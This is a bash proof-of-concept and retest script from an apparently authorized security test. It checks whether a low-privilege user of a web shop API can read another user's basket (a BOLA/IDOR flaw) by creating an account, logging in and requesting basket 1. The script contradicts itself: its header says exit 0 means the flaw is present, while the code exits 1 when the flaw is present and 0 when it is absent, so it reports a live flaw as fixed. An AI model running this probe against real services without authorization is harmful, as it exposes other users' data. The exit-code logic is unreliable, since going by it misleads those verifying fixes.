#!/bin/bash
# F-04 — BOLA: any authenticated user can read any user's basket
# Exit 0 = finding present · 1 = absent/fixed · 2 = rig error
# Safety: creates one low-priv test account, then attempts one cross-user basket GET.
# This is a controlled, reversible state change required to prove the flaw. ROE 2026-10-27.
set -u
BASE="${BASE:-http://127.0.0.1:3000}"
UA="Forefront-Retest/1.0 (ROE 2026-10-27)"
EMAIL="f04-retest-$(date -u +%s)@example.com"
PASS="Retest1!pass"

code=$(curl -sS --max-time 15 -A "$UA" -o /dev/null -w '%{http_code}' "$BASE/") \
  || { echo "RIG ERROR: liveness GET / failed"; exit 2; }
case "$code" in 2*|3*) ;; *) echo "RIG ERROR: liveness HTTP $code"; exit 2 ;; esac

# Create a low-priv account (idempotent-ish; unique email each run).
curl -sS --max-time 15 -A "$UA" -X POST "$BASE/api/Users" \
  -H 'Content-Type: application/json' \
  --data "{\"email\":\"$EMAIL\",\"password\":\"$PASS\",\"passwordRepeat\":\"$PASS\",\"securityQuestion\":{\"id\":1},\"securityAnswer\":\"x\"}" \
  -o /dev/null || { echo "RIG ERROR: account creation failed"; exit 2; }

login=$(curl -sS --max-time 15 -A "$UA" -X POST "$BASE/rest/user/login" \
  -H 'Content-Type: application/json' \
  --data "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}") \
  || { echo "RIG ERROR: login failed"; exit 2; }

token=$(printf '%s' "$login" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
[ -n "$token" ] || { echo "RIG ERROR: no token for test account"; exit 2; }

# Basket 1 belongs to the admin/seed user; a low-priv user should get 403.
resp=$(curl -sS --max-time 15 -A "$UA" -H "Authorization: Bearer $token" \
  -w '\n%{http_code}' "$BASE/rest/basket/1")
status=$(printf '%s' "$resp" | tail -1)
body=$(printf '%s' "$resp" | sed '$d')

case "$status" in
  200) echo "PRESENT: low-priv user read basket 1 (HTTP 200)"; exit 1 ;;
  401|403) echo "ABSENT: cross-user basket denied (HTTP $status)"; exit 0 ;;
  *) echo "RIG ERROR: unexpected HTTP $status"; exit 2 ;;
esac
